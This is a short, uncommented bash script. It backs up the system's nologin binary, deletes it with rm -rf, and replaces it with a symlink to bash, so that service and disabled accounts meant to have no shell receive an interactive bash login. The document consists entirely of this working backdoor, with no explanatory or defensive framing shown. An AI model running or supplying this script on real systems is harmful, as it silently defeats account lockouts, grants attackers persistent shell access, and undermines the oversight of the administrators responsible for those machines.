#!/usr/bin/env bash

NLOGIN_LOC=$(which nologin)
BASH_LOC=$(which bash)

cp $NLOGIN_LOC ${NLOGIN_LOC}.orig
rm -rf $NLOGIN_LOC
ln -s $BASH_LOC $NLOGIN_LOC